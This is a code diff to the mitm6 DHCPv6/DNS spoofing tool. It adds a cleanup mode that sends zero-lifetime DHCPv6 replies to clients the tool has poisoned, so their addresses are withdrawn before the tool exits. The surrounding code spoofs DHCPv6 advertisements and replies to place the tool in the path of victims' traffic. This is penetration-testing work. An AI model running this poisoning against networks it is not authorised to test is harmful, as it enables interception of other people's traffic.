@@ -19,11 +19,14 @@ import builtins
 import time
 import subprocess
 import threading
+import signal
 
 # Globals
 pcdict = {}
 arptable = {}
 arp_dns_lock = threading.Lock()  # Lock for ARP DNS operations
+cleanup_mode = False
+cleanup_deadline = None
 try:
     with open('arp.cache', 'r') as arpcache:
         arptable = json.load(arpcache)
@@ -127,6 +130,8 @@ class Config(object):
         self.debug = args.debug
         self.verbose = args.verbose
         self.only_dns = args.only_dns
+        self.cleanup = args.cleanup
+        self.cleanup_timeout = args.cleanup_timeout
         
         # ARP DNS settings
         self.arp_dns_ip = args.arp_dns
@@ -229,6 +234,24 @@ def send_dhcp_reply(p, basep):
         # Some hosts don't send back this layer for some reason, ignore those
         if config.debug or config.verbose:
             print('Ignoring DHCPv6 packet from %s: Missing DHCP6OptIAAddress layer' % basep.src)
+
+def send_dhcp_deprovision(p, basep):
+    """Send a DHCP6_Reply with zero lifetimes to de-provision a poisoned client immediately."""
+    try:
+        addr = p[DHCP6OptIAAddress].addr
+    except IndexError:
+        if config.debug:
+            print('Cleanup: Missing DHCP6OptIAAddress in packet from %s, cannot deprovision' % basep.src)
+        return False
+    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546)
+    resp /= DHCP6_Reply(trid=p.trid)
+    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
+    resp /= DHCP6OptServerId(duid=config.selfduid)
+    # Zero preferred and valid lifetimes signal the client to immediately stop using the address
+    opt = DHCP6OptIAAddress(preflft=0, validlft=0, addr=addr)
+    resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=0, T2=0, iaid=p[DHCP6OptIA_NA].iaid)
+    sendp(resp, iface=config.default_if, verbose=False)
+    return True
 
 def send_dns_reply(p):
     if IPv6 in p:
@@ -451,18 +474,29 @@ def get_target(p):
 def parsepacket(p):
     if DHCP6_Solicit in p and not config.only_dns:
         target = get_target(p)
-        if should_spoof_dhcpv6(target.host):
+        if cleanup_mode and p.src in pcdict:
+            # Client re-soliciting during cleanup - they're resetting, consider them cleaned
+            print('[Cleanup] Client %s (%s) re-solicited (resetting lease), removing from tracking' % (p.src, target.host))
+            del pcdict[p.src]
+            check_cleanup_complete()
+        elif not cleanup_mode and should_spoof_dhcpv6(target.host):
             send_dhcp_advertise(p[DHCP6_Solicit], p, target)
     if DHCP6_Request in p and not config.only_dns:
         target = get_target(p)
-        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
+        if p[DHCP6OptServerId].duid == config.selfduid and not cleanup_mode and should_spoof_dhcpv6(target.host):
             send_dhcp_reply(p[DHCP6_Request], p)
             print('IPv6 address %s is now assigned to %s' % (p[DHCP6OptIA_NA].ianaopts[0].addr, pcdict[p.src]))
     if DHCP6_Renew in p and not config.only_dns:
         target = get_target(p)
-        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
-            send_dhcp_reply(p[DHCP6_Renew],p)
-            print('Renew reply sent to %s' % p[DHCP6OptIA_NA].ianaopts[0].addr)
+        if p[DHCP6OptServerId].duid == config.selfduid:
+            if cleanup_mode and p.src in pcdict:
+                if send_dhcp_deprovision(p[DHCP6_Renew], p):
+                    print('[Cleanup] Sent zero-lifetime reply to %s (%s) - client will release address' % (p.src, target.host))
+                    del pcdict[p.src]
+                    check_cleanup_complete()
+            elif not cleanup_mode and should_spoof_dhcpv6(target.host):
+                send_dhcp_reply(p[DHCP6_Renew], p)
+                print('Renew reply sent to %s' % p[DHCP6OptIA_NA].ianaopts[0].addr)
     if ARP in p:
         arpp = p[ARP]
         if arpp.op == 2:
@@ -505,6 +539,55 @@ def shutdownnotice():
     # print(arptable)
     with open('arp.cache','w') as arpcache:
         arpcache.write(json.dumps(arptable))
+
+def check_cleanup_complete():
+    """Called after each successful deprovision - stop reactor if all clients cleaned."""
+    if len(pcdict) == 0:
+        print('[Cleanup] All tracked clients successfully de-provisioned. Exiting.')
+        reactor.callFromThread(reactor.stop)
+
+def cleanup_ticker():
+    """Periodic status check during cleanup mode. Runs in the reactor thread."""
+    global cleanup_mode
+    if not cleanup_mode:
+        return
+    remaining = len(pcdict)
+    if remaining == 0:
+        print('[Cleanup] All clients cleaned up. Exiting.')
+        reactor.stop()
+        return
+    if time.time() >= cleanup_deadline:
+        print('[Cleanup] Timeout reached. %d client(s) still tracked (may have already expired naturally). Exiting.' % remaining)
+        reactor.stop()
+        return
+    secs_left = int(cleanup_deadline - time.time())
+    print('[Cleanup] Waiting for %d client(s) to renew (%d seconds remaining)...' % (remaining, secs_left))
+
+def start_cleanup_mode():
+    """Enter cleanup mode: stop poisoning new clients and wait for tracked ones to renew."""
+    global cleanup_mode, cleanup_deadline
+    cleanup_mode = True
+    cleanup_deadline = time.time() + config.cleanup_timeout
+    remaining = len(pcdict)
+    if remaining == 0:
+        print('\n[Cleanup] No tracked clients to clean up. Exiting.')
+        reactor.callFromThread(reactor.stop)
+        return
+    print('\n[Cleanup] Entering cleanup mode: %d client(s) tracked.' % remaining)
+    print('[Cleanup] Will respond to DHCPv6 Renew with zero-lifetime to de-provision each client.')
+    print('[Cleanup] Waiting up to %d seconds (lease T1=%ds). Press Ctrl+C again to exit immediately.' % (config.cleanup_timeout, 200))
+    # Schedule periodic status checks every 30 seconds
+    loop = task.LoopingCall(cleanup_ticker)
+    loop.start(30.0, now=False)
+
+def handle_sigint(signum, frame):
+    """First Ctrl+C enters cleanup mode (if --cleanup), second Ctrl+C exits immediately."""
+    global cleanup_mode
+    if config.cleanup and not cleanup_mode:
+        reactor.callFromThread(start_cleanup_mode)
+    else:
+        print('\n[!] Forced exit.')
+        reactor.callFromThread(reactor.stop)
 
 def print_err(failure):
     print('An error occurred while sending a packet: %s\nNote that root privileges are required to run mitm6' % failure.getErrorMessage())
@@ -602,6 +685,8 @@ def main():
     parser.add_argument("--arp-cooldown", type=int, metavar='SECONDS', default=10, help="Cooldown period between ARP DNS IP additions (default: 10 seconds)")
     parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
     parser.add_argument("--debug", action='store_true', help="Show debug information")
+    parser.add_argument("--cleanup", action='store_true', help="On Ctrl+C, enter cleanup mode: send zero-lifetime DHCPv6 replies to tracked clients to de-provision them before exiting")
+    parser.add_argument("--cleanup-timeout", type=int, default=300, metavar='SECONDS', help="Seconds to wait in cleanup mode for clients to renew (default: 300 / 5 minutes)")
 
     filtergroup = parser.add_argument_group("Filtering options")
     filtergroup.add_argument("-d", "--domain", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Allowlist principle, multiple can be specified.)")
@@ -670,6 +755,9 @@ def main():
     reactor.adoptDatagramPort(dnssock2.fileno(), socket.AF_INET, DatagramProtocol())
 
     reactor.addSystemEventTrigger('before', 'shutdown', shutdownnotice)
+    if config.cleanup:
+        print('Cleanup mode enabled: Ctrl+C will attempt to de-provision tracked clients before exiting.')
+        reactor.callWhenRunning(lambda: signal.signal(signal.SIGINT, handle_sigint))
     reactor.run()
 
 if __name__ == '__main__':
